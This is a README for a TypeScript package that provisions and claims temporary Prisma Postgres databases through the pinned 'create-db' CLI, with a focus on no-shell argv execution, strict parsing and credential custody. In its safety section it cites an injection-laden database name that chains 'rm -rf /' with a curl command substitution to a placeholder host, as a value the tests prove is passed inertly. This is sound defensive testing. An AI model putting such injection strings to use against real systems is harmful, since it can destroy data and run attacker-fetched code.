# @hobo/provider-prisma-postgres

Prisma Postgres **temporary claimable databases** (`npx create-db`) as a HoBo
product definition plus its effectful driver. One product, one capability: a
real PostgreSQL database you can provision with no account, and later claim
into a Prisma Data Platform workspace.

## Product

| Facet | Value |
|---|---|
| Provider | `prisma` |
| Product / definition id | `prisma.claimable-postgres/v1` |
| Capability profile | `data.postgres/v1` (**native**) — therefore `data.relational/v1` by refinement |
| Runtime models | `oci`, `vm_iaas`, `paas`, `serverless_faas` |
| Bootstrap | public anonymous, claimable — no sign-up, no card |
| Provider interface | the pinned **`create-db@1.2.1`** CLI, not a REST API |
| Claim boundary | **resource** (one Prisma project/database), never the account |
| Claim atomicity | `single-resource`, with a typed associated-resource ref for bundled ceremonies |
| Binding profiles produced | `binding.postgresql/v1` |
| Migration profiles | `migration.postgres.pg-dump/v1` |
| Expiry | **`cli-local-clock`** — documented 24 h, but the deadline is computed by the CLI, not attested by Prisma |
| Sponsor exposure | 0 — the resource lives on Prisma's own free allowance |

A relational-only product (Cloudflare D1) satisfies `data.relational/v1` and
**never** `data.postgres/v1`; `test/selection.test.ts` pins that asymmetry with
the real `selectCapabilityImplementation`.

## Verified against official documentation

Everything below was read on the date shown. The npm row is the strongest of
them: the published `create-db@1.2.1` tarball was downloaded and its type
declarations and bundled CLI source read directly, so the JSON contract this
package parses is taken from the program that will actually run, not from prose
about it. The two web pages were retrieved through a search index rather than a
direct fetch (both direct fetches timed out from this environment); the quoted
output blocks, flag tables, and claim steps below are verbatim from that
retrieval, and every fact they contribute is independently corroborated by the
tarball or by the `prisma/create-db` repository README.

| Source | Checked | What it confirmed |
|---|---|---|
| <https://www.prisma.io/docs/postgres/npx-create-db> (the `docs.prisma.io/docs/postgres/npx-create-db` path redirects here) | 2026-08-08 | No sign-up required; **24-hour default lifetime**; the claim URL printed as `https://create-db.prisma.io?projectID=proj_…`; the connection string form `postgresql://<username>:<password>@db.prisma.io:5432/postgres`; the six-step claim ceremony (open URL → sign in to the Prisma Data Platform → **choose a workspace with capacity** → *Authorize Prisma Create DB*); post-claim the database moves into the workspace, stops auto-deleting, and stays usable; the pretty output's `Your database will be deleted on <date> if not claimed.` sentence, in locale format |
| <https://github.com/prisma/create-db> | 2026-08-08 | The CLI flag set (`--region/-r`, `--json/-j`, `--ttl/-t`, `--env/-e`, `--copy/-c`, `--quiet/-q`, `--open/-o`, `--interactive/-i`); the worker rate-limits at 100 requests/minute; unclaimed databases are deleted on a 24-hour schedule; the claim flow is OAuth into the Prisma Data Platform |
| <https://www.npmjs.com/package/create-db/v/1.2.1> | 2026-08-08 | The pinned version, and the `DatabaseResult`/`DatabaseError` shapes this package parses: `success`, `connectionString`, `claimUrl`, `deletionDate`, `region`, `name`, `projectId`, and on failure `error`, `message`, `status`, `rateLimitInfo.retryAfterMs`. **`deletionDate` is computed by the CLI from the local clock**, which is why this package labels the expiry source `cli-local-clock` |
| <https://www.prisma.io/blog/give-your-agent-a-database> | 2026-08-08 | `--json` is the supported machine-readable path for agents, with a sample document matching the field names above |

### Not verified, and treated as unknown

Unknown is modelled pessimistically, because an optimistic default here is a
claim about who can still read the customer's data.

- **What happens to the pre-claim credential after a claim.** The docs describe
  the transfer but never say the connection string issued before the claim is
  invalidated. So `creatorAuthorityAfterClaim` defaults to **`"unknown"`** and
  `continuity.credentials` to `"unknown"`, which the default trust policy
  rejects with `STRONG_CLAIM_REQUIRED`. A catalog owner who has confirmed
  rotation in the Prisma console opts in explicitly:

  ```ts
  createPrismaClaimablePostgresCandidate({
    creatorAuthorityAfterClaim: "rotatable",
    supportsRotation: true,
  });
  ```

- **Credential rotation and revocation APIs** are not documented for this tier,
  so the emitted binding declares `rotationSupported: false` and
  `revocationSupported: false` rather than promising them.
- **No read-by-id API.** There is no documented way to look a claimable database
  up after creation. `observe()` therefore reads the **local journal** and says
  so — every observation carries `evidence: "local-journal"` — and the journal
  is also the only adoption path (see *Idempotency* below).
- **No delete and no rotate command.** `create-db` creates; that is the whole
  CLI. `rotateBinding()` refuses with `BINDING_ROTATION_REQUIRED` rather than
  quietly re-provisioning under a caller, and `destroy()` reports the TTL reap
  instead of claiming a deletion it cannot perform (see *Lifecycle* below).
- **Logical replication** is not documented for the claimable tier, so
  `migration.postgres.logical-copy/v1` is **not** offered. Advertising a
  migration path that fails at execution time is worse than advertising one
  fewer.
- **`serverVersion`, `maxStorageBytes`, `maxConnections`, `extensions`** are not
  documented for the temporary tier and so are absent from
  `structuredCapabilities`.
- **Conformance is fixture-based.** `PRISMA_CONFORMANCE_REF` points at an offline
  suite driven by the sanitized fixtures in `test/fixtures/`. No live
  provisioning has been executed from this repository.
- **The default candidate ships `evidenceSignatureValid: true`.** The catalog
  owner is expected to re-sign.

## Why the expiry is labelled `cli-local-clock`

The published `create-db` types compute `deletionDate` as the local clock plus
the TTL; the service does not return a deadline. A caller that needs a
provider-attested expiry should not use this product for that decision, and the
record says so in the type rather than in a comment: `expirySource` is the
literal `"cli-local-clock"`, and the documented 24 hours is carried separately
as `documentedTtlHours`.

## Why a claim is not "done" when the transfer succeeds

The workspace transfer is one ceremony; the credential the creating party
already holds is a separate question the docs do not answer. The claim plan
therefore carries two **blocking** actions:

1. `prisma.claim.transfer-to-workspace` — the browser ceremony at the claim URL.
2. `prisma.claim.rotate-owner-credentials` — the new owner rotates the credential.

`verifyClaim()` returns `complete: false` while either is outstanding, and the
state `claimed-pending-rotation` names the gap. `attestRotation()` is the only
way to reach `complete`, and it refuses to run before the transfer is attested.

## Catalog record and compiler

Two data-only surfaces sit in front of the driver.

`PRISMA_CLAIMABLE_POSTGRES_SEMANTICS` is a **Resource Definition vNext**
semantics block: `productId`, the profile implementations, runtime models,
structured capabilities, placement constraints, `bootstrapStrategyRef:
"bootstrap.prisma.create-db/v1"`, `claimStrategyRef: "claim.prisma.database/v1"`,
compiler and executor refs, trust evidence, source evidence, remediation hints,
and the continuity facts. `PRISMA_RESOURCE_DEFINITION` wraps it with the legacy
port/feature half so an older planner still resolves the product.

The `ResourceDefinitionSemantics` shape is **mirrored structurally** in
`src/semantics.ts` rather than imported from `@hobo/cloud`. That keeps the
dependency arrow pointing one way — a provider is a leaf, the control plane
consumes it — and follows the precedent `@hobo/cloud` sets by declaring
`RegistrableProvider` locally so its own `src/` never imports a provider.
`test/semantics.test.ts` walks the required field list and the rules
`parseResourceDefinitionVNext` enforces, so the mirror cannot drift silently.

`compilePrismaProvision(requirement, placement)` turns a capability requirement
plus a chosen placement into a `PrismaProvisionOperation`. It is **pure**: no
clock, no network, no randomness, no environment, no filesystem. Everything
variable arrives as an argument, and the operation carries the literal argv, so
a reviewer can read the exact third-party command — pinned version included —
before anything runs. `test/compiler.test.ts` pins determinism and the absence
of any timestamp in the output.

Region is a **compile-time** decision here for a specific reason: run without
`--region`, the pinned CLI geolocates the calling host and picks for you. That
is not a placement anyone chose, so the compiler requires one of the six
documented regions and the placement constraints declare the same set.

## Lifecycle

| Operation | What it can actually do |
|---|---|
| `provision` | Runs the pinned CLI once per idempotency key, deposits the credential, returns the record. |
| `observe` | Reads the local journal — `live`, `expired`, `unresolved`, or `absent` — and labels the evidence `local-journal`. Never spawns a process. |
| `rotateBinding` | Refuses. The temporary tier documents no rotation surface; claim into a workspace and rotate there, or provision a replacement. |
| `destroy` | Revokes the deposited locator if a `SecretRevocationPort` is configured, then reports `reapMode: "ttl-expiry"` with `released: false` while the provider-side project is still on its timer. Refuses with `CLEANUP_FAILED` for a **claimed** database, which nothing reaps and this package cannot delete. |
| `export` / `import` | `pg_dump` / `pg_restore` through `createPostgresMigrationDriver`. |
| `verifyOwnership` | Fails closed without an independent `OwnershipProbePort`. |

`destroy()` returning `released: false` is the honest answer, not a bug: there
is no delete call, so the database outlives the call until Prisma reaps it.

## Bundled claims

`PrismaAssociatedResourceRef` is the typed relationship a Vercel-style bundled
claim strategy needs: which provider-side object this HoBo resource is
(`projectId`), that it can also be claimed on its own
(`standaloneClaimSupported: true`), where the standalone ceremony lives
(`claimUrl`, host-checked), and that the destination must be a workspace with
capacity. It contains no credential material, so a bundler may persist it.

## Safety properties

- **No shell, ever.** The CLI is invoked as an argv array through the injected
  `ProcessRunner`, with the version **pinned** (`create-db@1.2.1`; never
  `latest`, which would hand credential minting to an unreviewed program chosen
  at runtime). The child gets a deliberately small environment, not
  `process.env`.
- **Narrow, fail-closed parsing.** `--json` is the default and is parsed as
  exactly one JSON document. The `human-v1` fallback reads the documented
  labels and refuses anything else — no scraping a URI from wherever it appears,
  because a parser that keeps "working" after the format changes is worse than
  one that stops. Host checks are by **equality**, so
  `create-db.prisma.io.attacker.example` is rejected even though it starts with
  the official prefix.
- **HTTPS, allowlisted hosts, no redirects.** Both provider-supplied URLs are
  parsed against policy: `create-db.prisma.io` for the claim URL,
  `db.prisma.io` for the connection host, HTTPS only, no userinfo, default port.
  This package never issues a request to a provider-supplied URL, so no redirect
  is ever followed.
- **Bounded output and time.** stdout and stderr are capped (64 KiB) and the run
  is bounded (120 s), both configurable downward.
- **Public serialization requires private custody.** The connection string is
  deposited through `SecretCustodyPort`. Native SDK records remain privileged:
  project IDs, claim URLs, endpoints, and associated-resource metadata can
  identify or grant access to capabilities. The async `toProvisionReceipt` and
  `toProviderFacts` require custody, a private host HMAC key deriver, and a
  tenant/account/deployment scope. Their v2 projections carry opaque identities
  and custody locators; they refuse missing custody, invalid locators, native
  capability material, and credential-shaped output. Keep the native client
  idempotency journal inside the private custody boundary.
- **Idempotency and adoption.** One CLI run per idempotency key, ever. A repeat
  call adopts the recorded snapshot; a repeat call after an unresolved attempt
  raises `PROVIDER_OPERATION_AMBIGUOUS` and spawns nothing. Because there is no
  read-by-id API and no account to browse, a duplicate anonymous project is
  unreachable forever — failing is strictly better.
- **Ownership is not self-asserted.** `verifyOwnership()` reports the missing
  control-plane API as a failed signal and returns `verified: false` unless an
  independent `OwnershipProbePort` agrees with the record.
- **Migrations never touch a shell.** `pg_dump`/`pg_restore` are argv arrays;
  credentials travel in libpq environment variables. A database named
  `app; rm -rf / #$(curl evil.example)` lands as exactly one `--dbname=…`
  element, which `test/migration.test.ts` asserts.

## Parse, don't validate

The CLI hands this package a document it did not write, and the document
carries a credential. So there is exactly one parser boundary, and everything
past it works on **derived domain types** that cannot hold the rejected case:

- `parseCreateDbJson` / `parseCreateDbHumanV1` turn stdout into a
  `PrismaCreateResult` — a `proj_…` project id, a region from the documented
  six, a `deletionDate` instant, and the connection string. A document that is
  merely close is `PROVIDER_CONTRACT_CHANGED`; there is no partially trusted
  result to pass along.
- `assertAllowedProviderUrl` / `assertAllowedDatabaseHost` and
  `parsePostgresConnectionUri` are the only places a provider-supplied URL is
  read. Hosts are compared by equality
  (`create-db.prisma.io`, `db.prisma.io`), so a prefix lookalike is rejected,
  and the connection string leaves the parser as a `SecretRef` plus a non-secret
  endpoint inside one function scope.
- `compilePrismaProvision` produces a `PrismaProvisionOperation` whose argv is
  already reviewed: the region is required, the version is pinned, and no
  element needs quoting. The executor takes that parsed operation, not a set of
  strings plus a rule about how to combine them.
- `expirySource` is the literal `"cli-local-clock"` and `claim.state` is a
  four-member union, so "the CLI's clock said so" can never be reported as a
  provider attestation, and an unrotated credential cannot be spelled
  `complete`.

`data-models/provider_prisma_postgres.proto` declares those shapes and is
generated into `src/_generated/provider_prisma_postgres_pb.ts` by
`pnpm run codegen`; `data-models/provider_prisma_postgres.cue` carries the
invariants the parsers enforce (project-id and claim-URL form, the region union,
argv elements that need no quoting, the pinned specifier present and `@latest`
absent, locator-shaped secret refs).

The domain types are not hand-written copies of the wire messages. Each is a
`DomainView<Wire, …>` (see `src/wire.ts`) over its generated counterpart: the
fields it does not refine come straight from the generated type, and the ones
it does — the literal `kind`/`strategy`/`boundary` vocabulary, the region union,
`PrismaClaimState` in place of the numeric proto enum, epoch milliseconds as
JSON-safe numbers, and optional locators that stay absent rather than becoming
`""` — are named explicitly and key-checked against the message. Renaming a
proto field breaks the build here rather than drifting silently.

## Event architecture

This package is a strategy leaf. It owns no reducer, no stream, and no store:
the durable machinery is `@hobo/claims` plus `packages/hobo/src/claim-plane.ts`,
and what this package contributes is one honest observation per interaction.

1. A **command** from the claim family — `ReserveGuestLease`,
   `RecordProvisionedSubject`, `ObserveClaimItem`, `VerifyOwnership`,
   `RotateCapabilityBinding`, `ExpireGuestLease` — is what a caller issues.
   `driver.provision()`, `observe()`, `verifyOwnership()`, and
   `attestRotation()` are the effectful halves those commands drive here.
2. `await toProviderFacts(record, publicSerialization)` returns this package's observations
   (`provider.prisma.database.provisioned` / `.adopted`,
   `provider.prisma.claim.pending-rotation` / `.completed`,
   `provider.prisma.lease.expired`). They are locator-only facts, not durable
   events: the claim coordinator **actor** (`reduce` in `@hobo/claims`) is what
   turns them into the **events** `ProviderSubjectProvisioned`,
   `ClaimStatusObserved`, `OwnershipVerified`, `CapabilityBindingRotated`, and
   `GuestLeaseExpired`.
3. `applyClaimCommand` appends the command and those events to the durable
   **event store** on the `claim:<deploymentRef>` stream under an optimistic
   `expectedSeq`, after `assertNoSecrets` has refused any payload carrying a
   claim URL or a connection string.
4. `rebuildClaimState` folds the stored command journal back into a
   **snapshot** (`ClaimPlaneSnapshot`, carrying the store sequence it was folded
   at), which the next append fences against.
5. `claimStatusView` is the **projection** over that snapshot — the claim-bundle
   **materialized view**, per-item deadlines and outstanding obligations intact
   — and it is the **read store** `hobo claim status` renders.

Two local details matter to that chain. `observe()` reads this package's own
journal and labels every observation `local-journal`, so a `ClaimStatusObserved`
event sourced from here never pretends to be a provider read-back. And
`PrismaAssociatedResourceRef` is what lets a multi-resource bundle include this
database without the bundler ever holding a credential.

## Error codes

`PrismaProviderError.code` is one of `PROVIDER_RATE_LIMITED`,
`PROVIDER_AUTH_FAILED`, `PROVIDER_CONTRACT_CHANGED`,
`PROVIDER_OPERATION_AMBIGUOUS`, `PROVISIONING_CONFLICT`, `LEASE_EXPIRED`,
`CLAIM_EXPIRED`, `CLAIM_NOT_VERIFIED`, `BINDING_ROTATION_REQUIRED`,
`MIGRATION_FAILED`, `SECRET_CUSTODY_UNAVAILABLE`, `SECRET_REFERENCE_INVALID`,
`CLEANUP_FAILED`. Messages are redacted at construction.

## Usage

```ts
import {
  createInMemoryIdempotencyStore,
  createPrismaClaimableDatabaseDriver,
  createPrismaClient,
  toProvisionReceipt,
} from "@hobo/provider-prisma-postgres";

const client = createPrismaClient({
  runner, // spawns without a shell; see ProcessRunner
  store: createInMemoryIdempotencyStore(),
  clock: () => Date.now(),
});

const driver = createPrismaClaimableDatabaseDriver({ client, custody, clock: () => Date.now() });

const record = await driver.provision({
  idempotencyKey: "hobo:resource:main-db:0001",
  resourceRef: "hobo://yard/demo/data/main",
});

console.log(await toProvisionReceipt(record, publicSerialization));
// driver.associatedResource(record) is privileged claim-orchestration input.
```

The host supplies `publicSerialization = { custody, deriveOperationKey, scope }`.
Create `deriveOperationKey` with `createClaimableOperationKeyDeriver` from
`@hobo/core` using a privately stored, version-pinned key of at least 32 random
bytes. Retain that key version and the same scope across restart; use a new
`scope.scopeId` for each deployment incarnation. Do not derive the key from a
public name or anonymous credential placeholder. Public `resourceRef` values
are scope-bound hashes, and `opaquePhysicalId` also depends on the private key.
Resolve the native project identity, claim URL, endpoint, associated-resource
metadata, and optional binding only inside an authorized host. The serializer
has no public deterministic fallback.

Compiling first, if you want the command reviewable before it runs:

```ts
import { compilePrismaProvision } from "@hobo/provider-prisma-postgres";

const operation = compilePrismaProvision(
  { requiredProfiles: [{ profileId: "data.postgres/v1", versionRange: ">=1" }] },
  {
    region: "eu-central-1",
    resourceRef: "hobo://yard/demo/data/main",
    idempotencyKey: "hobo:resource:main-db:0001",
    ttl: "4h",
  },
);

console.log(operation.argv);
// ["npx","--yes","create-db@1.2.1","create","--json","--region=eu-central-1","--ttl=4h"]
```

## Tests

Fully offline; every fixture uses obviously fake values
(`fake_user_000000`, `proj_fake000000000000`, password `REDACTED`).

```bash
pnpm --filter @hobo/provider-prisma-postgres run build
pnpm --filter @hobo/provider-prisma-postgres run test
```

## Open coordinator action

`src/migration.ts` re-implements the `pg_dump`/`pg_restore` argv builders that
`@hobo/data-postgres` also exports, and the two migration-profile ids are
currently matched by a pinned constant rather than by import. That is a
deliberate hold, not a preference: adding `"@hobo/data-postgres": "workspace:*"`
to this package's dependencies is a cross-package coupling decision the
coordinator owns, not one this package should take unilaterally. Once the
coordinator registers the dependency, `src/migration.ts` should import
`buildPgDumpArgv`,
`buildPgRestoreArgv`, and `POSTGRES_MIGRATION_PROFILES` from `@hobo/data-postgres`
and keep only the credential-resolution wrapper.

Gates protecting this package: TypeScript (`strict`,
`exactOptionalPropertyTypes`, `noUncheckedIndexedAccess`), the consumer-driven
process-boundary contract in `contracts/create-db-cli-boundary.contract.json`
(executed by `test/contract.test.ts`) and its pact-shaped companion
`contracts/provider-prisma-postgres-create-db.pact.json`, the protobuf + CUE
boundary shapes in `data-models/` (generated into `src/_generated/` and checked
for drift by `pnpm run codegen:check`), and the credential scan in
`test/no-secret-leak.test.ts`.

The two contract documents describe one boundary in two vocabularies: the
`.contract.json` is the machine-readable half the runner test executes, and the
`.pact.json` states the same interactions in the shape every other boundary in
this repo uses — exit code as status, argv and environment as the request,
stdout document as the body — with the connection string and claim URL replaced
by the locator and host rule they become.

## Hosting budget execution

`createNodeProcessRunner()` is the shipped Node runner for the pinned CLI and migration
commands. It spawns argv without a shell, supplies only the explicit environment,
bounds each output stream while reading, and terminates the process group at its
deadline. Hosts explicitly supply executable search paths and required network settings.

Anonymous create intents require `IdempotencyStore.claim(record)` with atomic CAS;
a durable host persists that claim before spawning. Malformed success output remains
unresolved because the CLI may already have created a project.

Elapsed CLI-derived TTL never sets `released: true`. `destroy(record, context)` accepts
an independent `retirement` callback returning core `ResourceLifecycleObservation`.
Only fresh, exact-scope terminal absence plus final usage releases exposure. The result
carries both evidence references; without that proof it retains exposure. Local custody
revocation is separate from provider deletion. These outcome records are generated from
protobuf and constrained by CUE.

`createPrismaClaimableResolver` adapts the actual CLI-backed driver to the shared
resolver protocol with a durable CAS repository and mutation journal. The
idempotency key is scoped to tenant, provider account, deployment incarnation,
product and logical resource. Claim URLs and capability bindings enter custody;
only locators appear in resolver outcomes. A lost CLI result cannot cause a
second create. The CLI journal is local evidence, so resolver reads report
`ready: false` and `operationConfirmed: false`; deployment readiness requires an
independent database probe. A locally computed TTL does not establish provider
retirement or final charges. Deletion refuses without fresh authoritative
retirement and final-usage evidence.
